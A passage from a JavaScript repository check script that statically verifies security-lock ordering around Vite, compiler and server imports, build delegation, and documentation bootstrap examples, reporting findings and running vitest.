        /(?:from\s+|import\(\s*)['"]vite(?:-plus)?['"]/u.test(source) ||
        /['"][^'"]*\/vite\/dist\//u.test(source)
      ) {
        findings.push(
          `request-safe-runtime: ${file} must not construct Vite outside the compiler-first locked runner`,
        );
      }
      const lockIndex = source.indexOf('createSecurityLockedViteServer(');
      const corpusIndex = source.indexOf("server.ssrLoadModule('/tests/compiler-perf-corpora.ts')");
      const compilerIndex = source.indexOf(
        "server.ssrLoadModule('/packages/compiler/src/index.ts')",
      );
      if (lockIndex < 0 || corpusIndex <= lockIndex || compilerIndex <= corpusIndex) {
        findings.push(
          `request-safe-runtime: ${file} must lock Vite before loading compiler corpora and compiler source`,
        );
      }
    }
  }
  for (const file of SECURITY_LOCKED_NESTED_VITE_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    const assertionIndex = source.indexOf('assertRequestSafeRuntimeRealmLocked();');
    const artifactIndex = source.indexOf('ensureGalleryInteractiveServerArtifacts();');
    const createIndex = source.indexOf('createViteServer({');
    if (
      !source.includes("from 'vite-plus'") ||
      assertionIndex < 0 ||
      artifactIndex < 0 ||
      createIndex < 0 ||
      assertionIndex >= artifactIndex ||
      assertionIndex >= createIndex
    ) {
      findings.push(
        `request-safe-runtime: ${file} must assert the established runtime lock before compiler work and nested Vite creation`,
      );
    }
    if (source.includes('secure-vite-runtime.mjs') || source.includes('registerHooks')) {
      findings.push(
        `request-safe-runtime: ${file} must reuse the established Vite runtime without requesting loader hooks`,
      );
    }
  }
  let secureViteBuildRunnerSource;
  try {
    secureViteBuildRunnerSource = readText(SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE}`);
  }
  if (
    secureViteBuildRunnerSource !== undefined &&
    !secureViteBuildRunnerSource.includes('buildWithSecurityLockedVite')
  ) {
    findings.push(
      `request-safe-runtime: ${SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE} must use the compiler-first locked Vite build runner`,
    );
  }
  for (const file of SECURITY_LOCKED_IN_PROCESS_BUILD_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('buildWithSecurityLockedVite')) {
      findings.push(`request-safe-runtime: ${file} must build Vite in its locked process`);
    }
    if (/execFileSync\s*\(\s*['"](?:vp|corepack)['"]/u.test(source)) {
      findings.push(
        `request-safe-runtime: ${file} must not delegate Vite build authority to a child`,
      );
    }
  }
  for (const file of SECURITY_LOCKED_COMPILER_SCRIPT_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    const lockIndex = source.indexOf('await securityLockedCompilerRuntime();');
    const compilerImportIndex = source.indexOf("await import('@kovojs/compiler')");
    if (lockIndex < 0 || compilerImportIndex < 0 || lockIndex >= compilerImportIndex) {
      findings.push(
        `request-safe-runtime: ${file} must lock the compiler before importing compiler authority`,
      );
    }
  }
  for (const { file, snippet } of SECURITY_LOCKED_PACKAGE_BUILD_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes(snippet)) {
      findings.push(
        `request-safe-runtime: ${file} must route supported Vite builds through the locked build script`,
      );
    }
  }

  let secureViteRunnerSource;
  try {
    secureViteRunnerSource = readText(SECURITY_LOCKED_VITE_RUNNER_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${SECURITY_LOCKED_VITE_RUNNER_FILE}`);
  }
  if (secureViteRunnerSource !== undefined) {
    const orderedReferences = [
      "'../../packages/compiler/src/security-bootstrap.ts'",
      'compilerBootstrap.lockCompilerSecurityRealm();',
      "'../../packages/server/src/runtime-bootstrap.ts'",
      "return import('vite-plus');",
    ];
    let priorIndex = -1;
    for (const reference of orderedReferences) {
      const index = secureViteRunnerSource.indexOf(reference);
      if (index < 0 || index <= priorIndex) {
        findings.push(
          `request-safe-runtime: ${SECURITY_LOCKED_VITE_RUNNER_FILE} must lock compiler then server before importing Vite`,
        );
        break;
      }
      priorIndex = index;
    }
    if (/\bfrom\s+['"]vite-plus['"]/u.test(secureViteRunnerSource)) {
      findings.push(
        `request-safe-runtime: ${SECURITY_LOCKED_VITE_RUNNER_FILE} must not statically import Vite`,
      );
    }
  }

  let siteStaticExportSource;
  try {
    siteStaticExportSource = readText(SITE_STATIC_EXPORT_RUNNER_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${SITE_STATIC_EXPORT_RUNNER_FILE}`);
  }
  if (siteStaticExportSource !== undefined) {
    const lockIndex = siteStaticExportSource.indexOf('await securityLockedViteRuntime();');
    const cliImportIndex = siteStaticExportSource.indexOf(
      "await import('../../packages/cli/src/commands/build-export.js')",
    );
    if (lockIndex < 0 || cliImportIndex < 0 || lockIndex >= cliImportIndex) {
      findings.push(
        `request-safe-runtime: ${SITE_STATIC_EXPORT_RUNNER_FILE} must lock the runtime before importing the CLI/Vite graph`,
      );
    }
  }

  for (const file of PURE_APP_ENTRY_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (source.includes('createRequestHandler')) {
      findings.push(
        `request-safe-runtime: ${file} must export a pure app without a request handler`,
      );
    }
  }
  for (const file of CUSTOM_REQUEST_HANDLER_DOC_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    const codeBlocks = source.matchAll(/```(?:ts|tsx)\n([\s\S]*?)```/gu);
    let covered = 0;
    for (const block of codeBlocks) {
      const code = block[1] ?? '';
      if (!code.includes('createRequestHandler')) continue;
      covered += 1;
      const firstImport = code.split('\n').find((line) => line.trimStart().startsWith('import '));
      if (firstImport?.trim() !== RUNTIME_BOOTSTRAP_IMPORT) {
        findings.push(
          `request-safe-runtime: ${file} createRequestHandler block ${covered} must start imports with ${RUNTIME_BOOTSTRAP_IMPORT}`,
        );
      }
    }
    if (covered === 0) {
      findings.push(`request-safe-runtime: ${file} has no createRequestHandler bootstrap example`);
    }
  }
  return findings;
}

function sourceStringArray(source, declarationName) {
  const escapedName = declarationName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const declaredArray = new RegExp(
    `(?:export\\s+)?const\\s+${escapedName}\\s*=[^\\[]*\\[([\\s\\S]*?)\\]`,
    'u',
  ).exec(source);
  const declaration =
    declaredArray ?? new RegExp(`${escapedName}\\s*[^\\[]*\\[([\\s\\S]*?)\\]`, 'u').exec(source);
  if (declaration === null) {
    const emptySet = new RegExp(
      `const\\s+${escapedName}\\s*=\\s*new\\s+Set(?:<[^>]+>)?\\(\\s*\\)`,
      'u',
    );
    return emptySet.test(source) ? [] : undefined;
  }
  const values = [];
  const stringPattern = /(['"])(.*?)\1/gu;
  for (const match of declaration[1].matchAll(stringPattern)) values.push(match[2]);
  return values;
}

function sourceReviewedGlobalNamespaceMembers(source) {
  const start = source.indexOf('const REQUEST_REVIEWED_GLOBAL_NAMESPACE_MEMBERS');
  const end = start < 0 ? -1 : source.indexOf(']);', start);
  if (start < 0 || end < 0) return undefined;
  const block = source.slice(start, end + 3);
  const paths = [];
  const entryPattern =
    /\[\s*(['"])([^'"]+)\1\s*,\s*new Set\(\s*(?:\[([\s\S]*?)\])?\s*\)\s*,?\s*\]/gu;
  for (const entry of block.matchAll(entryPattern)) {
    const memberSource = entry[3] ?? '';
    for (const member of memberSource.matchAll(/(['"])(.*?)\1/gu)) {
      paths.push(`${entry[2]}.${member[2]}`);
    }
  }
  return paths;
}

export function main(options = {}) {
  const result = evaluateSecurityClassifierCorpus(options);
  process.stdout.write(
    `check-security-classifier-corpus/v1 ${result.ok ? 'OK' : 'FAIL'} corpora=${result.corpora}\n`,
  );
  for (const finding of result.findings) process.stderr.write(`${finding}\n`);
  return result.ok;
}

function runVitest(testFiles, root) {
  const result = spawnSync('pnpm', ['exec', 'vitest', '--run', ...testFiles], {
    cwd: root,
    encoding: 'utf8',
  });
  return {
    ok: result.status === 0,
    output: `${result.stdout ?? ''}${result.stderr ?? ''}`.trim(),
  };
}

if (isMainEntry(import.meta.url)) await runGate(main);
